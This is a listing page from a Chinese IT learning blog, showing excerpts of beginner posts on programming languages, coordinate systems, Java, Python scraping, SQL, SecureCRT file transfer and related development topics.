<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="IT学习者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="IT学习者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b10666b0765589dddef298a16156ac1d/" rel="bookmark">
			通俗的理解：什么是编程语言？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习编程语言之前，首先要搞清楚“编程语言”这个概念。
很小的时候，父母就教我们开口说话，也教我们如何理解别人讲话的意思。经过长时间的熏陶和自我学习，我们竟然在不知不觉中学会了说话，同时也能听懂其他小朋友说话的意思了，我们开始向父母要零花钱买零食和玩具、被欺负了向父母倾诉……
我们说的是汉语，是“中国语言”，只要把我们的需求告诉父母，父母就会满足，我们用“中国语言”来控制父母，让父母做我们喜欢的事情。
“中国语言”有固定的格式，每个汉字代表的意思不同，我们必须正确的表达，父母才能理解我们的意思。例如让父母给我们10元零花钱，我们会说“妈妈给我10块钱吧，我要买小汽车”。如果我们说“10元给我汽车小零花钱妈妈”，或者“妈妈给我10亿人民币，我要买F-22”，妈妈就会觉得奇怪，听不懂我们的意思，或者理解错误，责备我们。
我们通过有固定格式和固定词汇的“语言”来控制他人，让他人为我们做事情。语言有很多种，包括汉语、英语、法语、韩语等，虽然他们的词汇和格式都不一样，但是可以达到同样的目的，我们可以选择任意一种语言去控制他人。
同样，我们也可以通过”语言“来控制计算机，让计算机为我们做事情，这样的语言就叫做编程语言（Programming Language）。
编程语言也有固定的格式和词汇，我们必须经过学习才会使用，才能控制计算机。
编程语言有很多种，常用的有C语言、C++、Java、C#、Python、PHP、JavaScript、Go语言、Objective-C、Swift、汇编语言等，每种语言都有自己擅长的方面，例如：
编程语言主要用途C/C++C++ 是在C语言的基础上发展起来的，C++ 包含了C语言的所有内容，C语言是C++的一个部分，它们往往混合在一起使用，所以统称为 C/C++。C/C++主要用于PC软件开发、Linux开发、游戏开发、单片机和嵌入式系统。JavaJava 是一门通用型的语言，可以用于网站后台开发、Android 开发、PC软件开发，近年来又涉足了大数据领域（归功于 Hadoop 框架的流行）。C#C# 是微软开发的用来对抗 Java 的一门语言，实现机制和 Java 类似，不过 C# ，目前主要用于 Windows 平台的软件开发，以及少量的网站后台开发。PythonPython 也是一门通用型的语言，主要用于系统运维、网站后台开发、数据分析、人工智能、云计算等领域，近年来势头强劲，增长非常快。PHPPHP 是一门专用型的语言，主要用来开发网站后台程序。JavaScriptJavaScript 最初只能用于网站前端开发，而且是前端开发的唯一语言，没有可替代性。近年来由于 Node.js 的流行，JavaScript 在网站后台开发中也占有了一席之地，并且在迅速增长。Go语言Go语言是 2009 年由 Google 发布的一款编程语言，成长非常迅速，在国内外已经有大量的应用。Go 语言主要用于服务器端的编程，对 C/C++、Java 都形成了不小的挑战。Objective-C
SwiftObjective-C 和 Swift 都只能用于苹果产品的开发，包括 Mac、MacBook、iPhone、iPad、iWatch 等。汇编语言汇编语言是计算机发展初期的一门语言，它的执行效率非常高，但是开发效率非常低，所以在常见的应用程序开发中不会使用汇编语言，只有在对效率和实时性要求极高的关键模块才会考虑汇编语言，例如操作系统内核、驱动、仪器仪表、工业控制等。 可以将不同的编程语言比喻成各国语言，为了表达同一个意思，可能使用不同的语句。例如，表达“世界你好”的意思：
汉语：世界你好；英语：Hello World法语：Bonjour tout le monde 在编程语言中，同样的操作也可能使用不同的语句。例如，在屏幕上显示“我爱IT”：
C语言：puts("我爱IT");PHP：echo "我爱IT";Java：System.out.println("我爱IT"); 编程语言类似于人类语言，由直观的词汇组成，我们很容易就能理解它的意思，例如在C语言中，我们使用 puts 这个词让计算机在屏幕上显示出文字；puts 是 output string（输出字符串）的缩写。
使用 puts 在屏幕上显示“C语言”：
puts("C语言");
我们把要显示的内容放在("和")之间，并且在最后要有;。你必须要这样写，这是固定的格式。
总结：编程语言是用来控制计算机的一系列指令（Instruction），它有固定的格式和词汇（不同编程语言的格式和词汇不一样），必须遵守，否则就会出错，达不到我们的目的。
C语言（C Language）是编程语言的一种，学习C语言，主要是学习它的格式和词汇。下面是一个C语言的完整例子，它会让计算机在屏幕上显示‘‘C语言”。
这个例子主要演示C语言的一些固有格式和词汇，看不懂的读者不必深究，也不必问为什么是这样，后续我们会逐步给大家讲解。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b10666b0765589dddef298a16156ac1d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/861523983626afb5e7645fbfb9c80612/" rel="bookmark">
			一、坐标系之WGS84坐标系与WGS84 Web  Mercator
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		WGS84坐标系： WGS84是地心坐标系，空间直角坐标系，原点与地球质心重合，为GPS采用的坐标系；通过GPS可以直接获取WGS84下的坐标(B，L，H)，B为纬度，L为经度，H为大地高即到WGS84椭 球面的高度；
WKID:
4326GCS_WGS_1984 WGS84 Web Mercator坐标系： Web Mercator 是一个投影坐标系统，其基准面是 WGS 1984 。世界大地坐标系是美国国防部制图局（Defence Mapping Agency， DMA）为统一世界大地坐标系统，实现全球测量标准的一致性，定义用于制图、大地、导航的坐标基准。它包括标准地球坐标框架、用于处理原始观测数据的标准椭球参考面（即基准和参考椭球）和定义标准海平面的重力等势面（大地水准面）。
Web Mercator 坐标系使用的投影方法不是严格意义的墨卡托投影，而是一个被 EPSG（European Petroleum Survey Group）称为伪墨卡托的投影方法，这个伪墨卡托投影方法的大名是 Popular Visualization Pseudo Mercator，PVPM。
WKID:
3857或者102100 WGS_1984_Web_Mercator_Auxiliary_Sphere 一、椭球参数：
二、定义：
定义坐标系文件一般为*.prj，例如WGS 1984.prj。EPSG:http://epsg.io/4326(对于坐标系详细定义)
python:
from osgeo import gdal,osr '''方法一''' sr = osr.SpatialReference() sr.SetWellKnownGeogCS('WGS84') print(sr.ExportToWkt()) print('-'*200) '''方法二''' sr1 = osr.SpatialReference() sr1.SetWellKnownGeogCS("EPSG:4326") print(sr1.ExportToWkt()) print('-'*200) 三、两种坐标系之间的相互转换：
from osgeo import osr import math def lonLat2WebMercator(lon,Lat): x = lon *20037508.34/180; y = math.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/861523983626afb5e7645fbfb9c80612/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95131bf91828e54961d42a41f96e6ea2/" rel="bookmark">
			Bibtex 参考文献写作流程，结合NoteExpress
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		利用搜索引擎搜索下载文献，外文的导出到endnote格式 ，中文导出到noteExpress等。统一导入到noteexpress中。Bibtex对于每一篇论文，或者报告建立一个参考文献文件。在NoteExpress中选择论文中需要引用的文献，复制到bibtex中。在Latex中进行引用。 % Latex 不同参考文献格式选择。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60159495ee125613be9b933c2a83e20a/" rel="bookmark">
			【Arduino】串口乱码解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在做毕设，需要实现两块arduino板之间的通信，两板芯片都是atmega328p。蓝牙模块用的spp-ca。
第一块主控制板接蓝牙，我需要将手机发送给蓝牙的数据传送到第二块板（舵机控制板），这样我就能实现用手机控制舵机（其实就是机械臂）抓取动作。
在第一块主板程序里模拟了两个软串口，一个是Bluetooth serial，也就是接蓝牙的管脚，用来接受蓝牙数据，另一个是myserial，用来接舵机控制板。
在程序里定义char变量send_data。下面是程序：
send_data=BluetoothSerial.read();
mySerial.print (send_data);
照理说，这时候舵机控制板就能读取到蓝牙数据了，但是头疼的问题来了，用usb-ttl接电脑上位机一看，全是乱码。
一开始以为是波特率的问题，波特率都是9600，然后试了好几种波特率， 没有一个行的。
然后！我就试试加了两个延时函数！就好了！哈哈哈哈，激动。改过后的程序：
send_data=BluetoothSerial.read();
delay（3）；
mySerial.print (send_data);
delay（5）；
波特率都是9600，完美解决。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/389c65cbfa5a8f5b57ace1ab4e8cf3a8/" rel="bookmark">
			信息检索导论-读书笔记(1)-信息检索导论基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 信息检索导论-读书笔记(1)-信息检索导论基础知识0. 本文概述1. 倒排索引和布尔检索1.1 倒排索引的构建1.2. 布尔查询的处理1.3 基本布尔操作的扩展以及有序检索 2 词项词典及倒排记录表2.1 词项集合的确定2.2 基于跳表的倒排记录表快速合并算法2.3 含位置信息的倒排记录表和短语查询 3. 词典及容错式检索3.1 通配符查询3.2 拼写校正 4. 索引构建4.1 基于块的排序索引构建算法（BSBI）4.2. 内存式单遍索引构建算法（SPIMI）4.3 分布式索引构建方法4.4 动态索引构建方法 5. 索引压缩5.1 词典压缩5.2 倒排记录表的压缩 6. 文档评分、词项权重计算及向量空间模型6.1 参数化索引和域索引6.2 词项频率和权重计算6.3 向量空间模型6.4 其他tf-idf权重计算方法6.5 文档长度的回转归一化 7. 一个完整搜索系统中的评分计算7.1 快速评分及计算7.2 信息检索的组成 8. 信息检索的评价 信息检索导论-读书笔记(1)-信息检索导论基础知识 本文是对国科大2018-2019年春季教授的信息检索课程的复习总结，主要参考《信息检索导论》一书以及老师上课所用课件。根据书中章节的划分，本系列文章为五个部分，本文是第一部分：信息检索的基础知识，其余部分如下：
信息检索导论-读书笔记(1)-信息检索导论基础知识信息检索导论-读书笔记(2)-相关反馈和查询扩展、概率模型待完成信息检索导论-读书笔记(3)-信息检索中的机器学习和数值方法待完成信息检索导论-读书笔记(4)-信息检索中的文档聚类待完成信息检索导论-读书笔记(5)-信息检索的应用-Web搜索待完成 0. 本文概述 本文主要介绍信息检索的基础知识，也是搜索引擎的核心理论。首先介绍倒排索引，包括其构建之前的预处理、构建的过程、以及用于布尔查询时如何使用，然后基于上面的过程，针对具体的场景，提出了具体的改进方法：
如何处理短语查询？进行布尔查询时存在查询拼写错误或者不能精确匹配的情况时如何处理？如何为大规模文档集构建索引？如何对词典和倒排记录表进行压缩以节省空间？ 在对布尔查询及其扩展有了基本的了解之后，我们知道了如何从文档集中检索出匹配的文档，但是并不知道每一篇文档匹配的程度，因此剩下的内容将会介绍如何对文档和查询的匹配程度进行度量，主要包括词项权重的计算以及评分算法。
有了上面的内容，我们已经对一个简单的搜索引擎的基础组成部分有了大致的了解，最后，将会介绍如何对一个检索系统进行评价。
1. 倒排索引和布尔检索 布尔检索也称为布尔逻辑检索，是指利用布尔逻辑运算连接各个检索式，然后由检索系统执行相应逻辑计算，以找出所需信息的犯法。在该模型下，每篇文档只被看成是一些列词的集合。
为了执行布尔检索式，我们需要提前对文档集建立索引，即词项-文档关联矩阵，词项是索引的单位，我们会在下面的预处理中再次提到它，关联矩阵就是为了记录某一篇文档是否包含词表中的每个词，这里的词表指的是文档集包含的所有词项的集合，所以关联矩阵的大小是 m ∗ n m*n m∗n， m m m是文档集中的文档数量， n n n是文档集包含的所有词项的总数，矩阵中每一个值的取值范围是0或1，分别表示不包含该词项和包含该词项。
有了词项关联矩阵我们就可以对布尔检索式进行逻辑运算了，比如我们希望查找 ( A A n d B ) (A And B) (AAndB)即同时包含A和B的文档，可以取出关联矩阵中词项A的那一列和词项B的那一列，然后统计两列数据中同时取1的那些行，即是我们想要的结果。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/389c65cbfa5a8f5b57ace1ab4e8cf3a8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73d8ab47e5e1eab6cb57b72b03ca6ebe/" rel="bookmark">
			代码块、静态代码块、静态方法、构造方法顺序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面试时经常会碰到一些关于静态方法加载的试题，主要是考察面试者对于子父类加载顺序的了解，今天做一节小结，记录一些。总是感觉代码不写出来自己测试的话，感觉总是不牢靠，所有把今天的代码记录一下。
package 静态static;
public class Statictest {
public static void main(String[] args) {
B b = new B(“b”);
}
}
class A {
public String name;
public A() { // this.name = name; System.out.println("类A new的无参构造方法此时name=" + name); } public A(String name) { this.name = name; System.out.println("类A new时参数为" + name + "的构造方法"); } D d=new D("a"); { System.out.println("A父类代码块"); } static { System.out.println("A父类静态代码块"); } public static String eat() { return "A静态方法"; } public String say() { return "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/73d8ab47e5e1eab6cb57b72b03ca6ebe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6883180201a11cb65a3c6104a93f3bf4/" rel="bookmark">
			C&#43;&#43;内存四区详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		堆区，栈。。。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/467c35aa7c977e1b94c933d54ba85827/" rel="bookmark">
			pycharm错误：AttributeError: module &#39;string&#39; has no attribute &#39;uppercase&#39;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		将string.uppercase换成string.ascii_uppercase
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ace8100f35f631ff0850af5c59f9eee/" rel="bookmark">
			Java: null是什么？？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		null是什么？ 在学习过对象的实例化之后， 我们知道对象的实例化就是为对象的创建开辟存储空间。
对于一条实例化语句:
Student stu=new Student(); //语句1
先是声明一个名为stu的Student类型变量，然后利用new关键字为其创建实例。
与下面的语句相比较:
Student stu; //语句2
语句2是声明一个类型为Student 的变量stu,从表述习惯上讲stu 是实例变量，但实际上此时stu并未成为一个真正的实例，它仅仅只是一个变量名字。
stu= new Student(); //语句3
语句3的执行结果就使得stu真正成为了一个Student实例，它指向了内存中的某块地址空间。
语句1是一步到位，定义了一个实例变量并同时赋值。
1.对于null的理解
为了明确地表示那些仅有名字而没有实例空间的变量的具体内容，Java引入了关键字null, null 就是表示“空”的意思，是绝对意义上的空，这个空指的是不存在的意思。为了更好地理解null是什么，这里举个例子:
有个准备进人施工阶段的楼字建筑项目，设计图纸已经确定了，建筑设计师们正在讨论某间单元的装修效果时，该单元的房号已经命名，假设为A901，此时，A901就是null的，它相当于上面写的语句2(一个名为stu的Student),这里它只是一个名为A901的房屋单元。
而当该楼字项目已经施工完毕的时候，则A901就地在它所处的位置上真正地占有了一块物理空间，此时它就是非null(非空)了，也就是说它拥有了一块实例化的空间。就算这间房屋里头没有摆放东西，它也是存在的。我们千万不能将日常表达语“一间空的房问”等同于Java语言中的"房间为空”。
在Java中，假设房间类为Room,则:
Room room=null; //房间为空，房间room只是一个名字，实际不存在。
Room room= new Room(); //一间空的房间，这间房里没东西。 null就是空，抽象意义上的空，空就是无的概念。
对于null的理解，应该是这样的:仅有一个变量名，但实际上不存在。
2. null的作用
(1) 判断一个对象实例是否null,
用if(obj= = null){}来判断。
(2) 释放内存，让一个非null的实例变量赋值为null,这样这个实例指针引用就被释放了，等待JVM回收其对应的内存垃圾。
3.使用null时要注意的问题
(1) null是关键字，是大小写敏感的，不能将null写成Null或NULL.
(2) null用来标识一个空的对象，因此不能将null赋给基本型的变量。比如:
String s= null; //正确
int i=null; //错误，应修正为"int i=0;"char c= null; //错误
(3) 对于一个值为null 的对象，如果你试图去访问其成员，则会触发空指针异常(NullPointerException)。
(4) 用instancaeof(判断对象是否属于某种类型)去操作null对象，会返回false.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4ace8100f35f631ff0850af5c59f9eee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/805551df57ba239461eee24f7c12ce8f/" rel="bookmark">
			java.lang.UnsatisfiedLinkError: dalvik.system.PathClassLoader[DexPathList
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		出现的错误：
java.lang.UnsatisfiedLinkError: dalvik.system.PathClassLoader[DexPathList[[zip file "/data/app/com.example.app_myapp-1/base.apk", zip file "/data/app/com.example.app_myapp-1/split_lib_dependencies_apk.apk", zip file "/data/app/com.example.app_myapp-1/split_lib_slice_0_apk.apk", zip file "/data/app/com.example.app_myapp-1/split_lib_slice_1_apk.apk", zip file "/data/app/com.example.app_myapp-1/split_lib_slice_2_apk.apk", zip file "/data/app/com.example.app_myapp-1/split_lib_slice_3_apk.apk", zip file "/data/app/com.example.app_myapp-1/split_lib_slice_4_apk.apk", zip file "/data/app/com.example.app_myapp-1/split_lib_slice_5_apk.apk", zip file "/data/app/com.example.app_myapp-1/split_lib_slice_6_apk.apk", zip file "/data/app/com.example.app_myapp-1/split_lib_slice_7_apk.apk", zip file "/data/app/com.example.app_myapp-1/split_lib_slice_8_apk.apk", zip file "/data/app/com.example.app_myapp-1/split_lib_slice_9_apk.apk"],nativeLibraryDirectories=[/data/app/com.example.app_myapp-1/lib/arm, /vendor/lib, /system/lib]]] couldn't find "libHardControl.so"
原因：
我将android studio 3.4.0中的HardControl.java的如下代码中的“hardcontrol”写成了 “HardControl”，从而导至了如上的错误。
package com.example.hardlibrary; public class HardControl{ public static native int ledCtrl(int which,int status); public static native int ledOpen(); public static native void ledClose(); static{ try { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/805551df57ba239461eee24f7c12ce8f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/68397fc6c0333527e5a01a0376ad0e54/" rel="bookmark">
			SpringBoot中 Jackson 日期的时区和日期格式问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、使用场景
1.1、数据库MySQL也是有时区的概念的。
1.2、系统时区意味着与计算机的操作系统时区相同。
1.2、SpringBoot默认的Json视图转换框架Jackson也有时区概念
2、代码实现
2.1、解决方案一下在每个带有日期地方加上注解
2.2、只需要配置一个bean实现整体修改
2.3、使用SpringBoot的配置方式
3、成果展现
4、总结
1、使用场景 因为最近项目需要国际化，需要能够支持多种国际化语言，目前需要支持三种(法语、英语、简体中文)。我们的项目部署环境为使用阿里云(德国)节点。以前我们项目主要用户在中国国内。一部署到德国服务器节点就出现一个问题了。数据返回的时间不对，存储的时间也有时差了。此文章仅仅与UTC标准时间与北京时间(东八区时间)作为实际例子。最后跟踪发现，如下几点原因：
1.1、数据库MySQL也是有时区的概念的。 通过如下命令可以查询MySQL的时区
show variables like "%time_zone%"; 如果未做任何修改会显示如下：
+------------------+--------+ | Variable_name | Value | +------------------+--------+ | system_time_zone | CST | | time_zone | SYSTEM | +------------------+--------+ 2 rows in set (0.00 sec) #time_zone说明mysql使用system的时区，system_time_zone说明system使用CST时区 1.2、系统时区意味着与计算机的操作系统时区相同。 以下是我们北京时间使用MySQL时区
set global time_zone = '+8:00'; ##修改mysql全局时区为北京时间，即我们所在的东8区 &gt; set time_zone = '+8:00'; ##修改当前会话时区 &gt; flush privileges; #立即生效 或者通过修改MySQL的 my.cnf配置文件来修改时区
# vim /etc/my.cnf ##在[mysqld]区域中加上
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/68397fc6c0333527e5a01a0376ad0e54/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7cfe1270f240edc402d554502136ca5e/" rel="bookmark">
			五款中文分词工具在线PK: Jieba, SnowNLP, PkuSeg, THULAC, HanLP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近玩公众号会话停不下来：玩转腾讯词向量：Game of Words（词语的加减游戏），准备把NLP相关的模块搬到线上，准确的说，搬到AINLP公众号后台对话，所以，趁着劳动节假期，给AINLP公众号后台聊天机器人添加了一项新技能：中文分词线上PK，例如在AINLP公众号后台对话输入：中文分词 我爱自然语言处理，就可以得到五款分词工具的分词结果：
现在的开源中文分词工具或者模块已经很丰富了，并且很多都有一些在封闭测试集上的效果对比数据，不过这仅仅只能展现这些分词工具在这个封闭测试集上的效果，并不能全面说明问题，个人觉得，选择一个适合自己业务的分词器可能更重要，有的时候，还需要加一些私人定制的词库。
这次首先选了5款中文分词工具，严格的来说，它们不完全是纯粹的中文分词工具，例如SnowNLP, Thulac, HanLP都是很全面的中文自然语言处理工具，这次，先试水它们的中文分词模块。安装这些模块其实很简单，只要按官方文档的方法安装即可，以下做个简单介绍，在Python3.x的环境下测试，Ubuntu16.04 或 MacOS 测试成功。
1） Jieba: https://github.com/fxsjy/jieba
“结巴”中文分词：做最好的 Python 中文分词组件
"Jieba" (Chinese for "to stutter") Chinese text segmentation: built to be the best Python Chinese word segmentation module.
特点
支持三种分词模式：
精确模式，试图将句子最精确地切开，适合文本分析；
全模式，把句子中所有的可以成词的词语都扫描出来, 速度非常快，但是不能解决歧义；
搜索引擎模式，在精确模式的基础上，对长词再次切分，提高召回率，适合用于搜索引擎分词。
支持繁体分词
支持自定义词典
MIT 授权协议
安装：
代码对 Python 2/3 均兼容
全自动安装：easy_install jieba 或者 pip install jieba / pip3 install jieba
半自动安装：先下载 http://pypi.python.org/pypi/jieba/ ，解压后运行 python setup.py install
手动安装：将 jieba 目录放置于当前目录或者 site-packages 目录
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7cfe1270f240edc402d554502136ca5e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5aaadcc77ba0a3db3996640ede86e1c/" rel="bookmark">
			python之爬贴吧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		eg:
#要爬取某个贴吧前100页内容
import requests
class TiebaSpider:
def init(self,name,num):
self.num=num #爬取页面数量
self.name=name #爬取贴吧名称
self.url_temp=“https://tieba.baidu.com/f?kw="+self.name+"&amp;ie=utf-8&amp;pn={}” #打开浏览器照着写
self.headers={“Referer”:“https://tieba.baidu.com/f?kw=李毅&amp;ie=utf-8”,
“User-Agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36”,
“Request URL”: “https: // tbmsg.baidu.com / gmessage / get?mtype = 1 &amp; _ = 1556541342355”,
“Request Method”: “GET”
}
def get_url_list(self): return [self.url_temp.format(i*50) for i in range(self.num) ] def parse_url(self,url): #获取每一个url的响应并且解析，注意这里解析是utf-8 print(url) #输出这个url,让我们看一看 response=requests.get(url,headers=self.headers) return response.content.decode() def save_html(self,html_str,page_num): file_path="{}-第{}页.html".format(self.name,page_num) with open(file_path,"w",encoding="utf-8") as f: f.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5aaadcc77ba0a3db3996640ede86e1c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/950920a548ead07e92b28d0e1a774231/" rel="bookmark">
			GetForegroundWindow获取的是托管进程ApplicationFrameHost，而不是真正的进程，比如XD软件...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题描述
最近做一个实时检测系统当前激活进程的软件，Photoshop、PPT、Word都没有问题，但是无法检测到XD软件的进程，返回的仅仅是ApplicationFrameHost进程，经过研究发现：XD软件被进程ApplicationFrameHost托管， 因此GetForegroundWindow()方法返回带有标题的窗口,但不返回托管的实际进程,
解决思路
解决方法是再次通过EnumChildWindows获取ApplicationFrameHost的子窗口句柄，直到获取到实际进程。
代码：
GitHub ：https://github.com/qiuxianhu/WinFormGetActiveProcess
CSDN：
转载于:https://www.cnblogs.com/qtiger/p/10792160.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc929ff5eaf1e2f9236a86f530f3d6c7/" rel="bookmark">
			面试之——查询所有分数大于80的人
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mysql&gt; select name from test group by name having min(code)&gt;80;
查询分数大于80的所有人
查询分数大于80的所有人及相关信息
mysql&gt; select *from test where name in (
-&gt; select name from test group by name having min(code)&gt;80);
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01025d3334fa9f93dd08530616ec8ee0/" rel="bookmark">
			使用SecureCRT上传或下载文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 使用SecureCRT上传文件 一：上传文件的方法 1：先建立连接，用SSH协议，22端口 填好对应的IP地址，用户名
如果该用户没有密码就可直接登录，如果有密码会弹框提示你输入用户名和密码
2：成功建立连接后，连接SFTP标签页 2.1：右键单击对话框中连接的地址名，选择新建SFTP标签页2.1：也可以直接使用快捷键ALT+P快速新建SFTP标签页
3：在SFTP标签页设置好上传的文件的目录并上传或下载 3.1：设置本地上传或下载文件的目录：
lcd 本地目录 3.2：设置远程接受文件的目录：
cd 远程目录 ★注：
举个例子用自己的主机win7向远程Linux主机上传文件，本地目录是指自己的主机win7要上传文件的目录，而远程Linux主机要接受该文件的目录是远程目录
3.3：上传方法
上传指令put 本地目录下的文件名：即可把本地文件上传至所连接的远程服务器也可直接在设置好本地目录和远程目录的前提下，直接将本地文件拖动至SFTP标签页 3.4：下载方法
下载指令get 远程目录下的文件名：即可把设置好的远程目录下的文件下载到本地指定目录 二：上传中遇到的问题 1：用SecureCRT 用put -r上传文件 显示系统找不到指定文件 明明指定了上传目录，而且上传目录中明明有该文件，但上传时就是显示系统找不到指定文件
2：put: failed to upload xxx 拒绝访问 直接拖拽文件到SFTP标签页，显示路径D:/拒绝访问
三：解决方法 我的情况是使用命令put 上传文件名报错问题1，直接拖拽文件到SFTP标签页显示报错问题2，最终都用下面的 &amp;1方法 解决了。
&amp;1：上传路径存在中文或者空格，将要上传的文件放在纯英文目录下，即可
&amp;2：一般是因为打开sftp会话的用户对服务端的那个目录没有读写权限
登陆服务器时 并不是直接登陆的 root 用户，虽然后来也切换了 root 用户 但是 SecureCRT sftp还是以最开始ssh登录的用户而不是su后的用户为准，导致权限不够
有两种解决办法
第一种，直接用root用户登录 ssh 再操作SFTP窗口第二种，切换到root用户后，用chmod 给我要上传的服务器文件夹赋权限，可读写为chmod 777，权限大小各位可以视情况而定 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce22e8156dc13ed9f07a1def40d811f9/" rel="bookmark">
			mac通过xampp本地起服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、下载安装xampp
网址:https://www.apachefriends.org/index.html
然后进行双击进行安装，在启动台中出现图标
2、点击图标进入之后显示页面
在General中点击start,Status变成绿色,会显示出现一个IP，如下图
3、点击Services,点击Start All 开启所有服务 如下图所示
4、在浏览器中输入http://192.168.64.2/dashboard/可以显示网页内容 说明安装成功
5、点击Netword ,点击Enable，可以选择端口号localhost:8080
6、点击Volumes，点击Mount后点击Explore，出现文件夹，在文件夹htdocs中将写的项目放在文件夹里
6、可以在localhost:8080/填写文件路径，如图所示
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cb2fd3e296deed6b2f47163e7e380479/" rel="bookmark">
			ArcGIS开发中EGSG坐标系问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		常见坐标 EPSG:4326
WGS84坐标系的大地坐标系形式，即经纬度表示法，无法用于平面坐标。被用于GPS中。
EPSG:3857
WGS84坐标系的墨卡托投影形式，即XY表示法，用于平面坐标中。被广泛用于谷歌地图、OpenStreetMap、Bing、ArcGIS、ESRI等。
EPSG坐标系查询 所有的EGSG坐标系编码都可以在EPSG组织的网站进行查询，网址如下：
https://epsg.io/
另外，更详细信息可参考如下网站：
http://sis.apache.org/tables/CoordinateReferenceSystems.html
UTM UTM (Universal Transverse Mercator)坐标系，即通常所说的"通用横轴墨卡托投影"或“UTM投影”，投影方式为等角横轴割椭圆柱投影。是测量领域WGS-84坐标系采用的标准投影。
